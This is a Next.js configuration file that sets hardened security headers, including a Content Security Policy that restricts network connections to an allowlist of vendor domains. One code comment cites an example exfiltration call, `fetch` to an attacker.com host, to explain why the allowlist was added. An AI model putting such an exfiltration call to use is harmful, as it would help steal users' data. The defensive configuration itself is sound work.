import type { NextConfig } from "next";
import { withSentryConfig } from "@sentry/nextjs";

const nextConfig: NextConfig = {
  // Do NOT set output: "standalone" for Vercel — it uses its own build output.
  // standalone is only needed for Docker / self-hosted Node.js deployments.
  poweredByHeader: false,

  async headers() {
    // H10 + H11 — explicit CSP.
    //
    // `connect-src` is now an allowlist instead of `https:`. Previously
    // an XSS that slipped past (e.g. through `unsafe-inline`) could
    // exfiltrate data via `fetch("https://attacker.com", ...)`; the
    // allowlist below limits network egress to the vendors we actually
    // integrate with. Add new entries here when a new vendor is wired.
    //
    // `'unsafe-eval'` removed — React 19 + Next.js 15 app router don't
    // need it in production. `'unsafe-inline'` on `script-src` stays
    // for now because Next.js still ships inline hydration scripts; we
    // will migrate to a per-request nonce in middleware as a follow-up
    // (H11 phase 2). `style-src` keeps inline for Tailwind / styled
    // components.
    //
    // New directives added: `form-action` (blocks attacker-controlled
    // submission targets), `base-uri` (blocks `<base>` tag injection),
    // `object-src 'none'` (no plugin content).
    const connectSrc = [
      "'self'",
      "https://api.stripe.com",
      "https://checkout.stripe.com",
      "https://*.ingest.sentry.io",
      "https://*.ingest.us.sentry.io",
      "https://inngest.com",
      "https://api.inngest.com",
      "https://api.resend.com",
      "https://api.openai.com",
      "https://api.anthropic.com",
      "https://oauth2.googleapis.com",
      "https://www.googleapis.com",
      "https://login.microsoftonline.com",
      "https://graph.microsoft.com",
      "https://us-east-1.recall.ai",
      "https://api.apollo.io",
    ].join(" ");

    return [
      {
        source: "/(.*)",
        headers: [
          {
            key: "Content-Security-Policy",
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' blob: data: https:",
              "font-src 'self' data:",
              `connect-src ${connectSrc}`,
              "frame-ancestors 'none'",
              "form-action 'self'",
              "base-uri 'self'",
              "object-src 'none'",
              "worker-src 'self' blob:",
              "manifest-src 'self'",
            ].join("; "),
          },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "X-Frame-Options", value: "DENY" },
          // X-XSS-Protection is deprecated; modern browsers ignore it
          // and removing it cuts surface area for odd legacy behavior.
          {
            key: "Referrer-Policy",
            value: "strict-origin-when-cross-origin",
          },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=()",
          },
          {
            key: "Strict-Transport-Security",
            value: "max-age=63072000; includeSubDomains; preload",
          },
          // Cross-origin isolation — blocks Spectre-class leaks via
          // popups / embedded contexts.
          {
            key: "Cross-Origin-Opener-Policy",
            value: "same-origin-allow-popups",
          },
          {
            key: "Cross-Origin-Resource-Policy",
            value: "same-origin",
          },
        ],
      },
    ];
  },
};

// Wrap with Sentry only when a DSN is set. When unset, skipping the
// wrap keeps dev builds slightly faster and avoids warning noise about
// the missing SENTRY_AUTH_TOKEN.
const SENTRY_DSN =
  process.env.SENTRY_DSN ?? process.env.NEXT_PUBLIC_SENTRY_DSN;

export default SENTRY_DSN
  ? withSentryConfig(nextConfig, {
      org: process.env.SENTRY_ORG,
      project: process.env.SENTRY_PROJECT,
      silent: !process.env.SENTRY_AUTH_TOKEN,
      widenClientFileUpload: true,
      disableLogger: true,
    })
  : nextConfig;
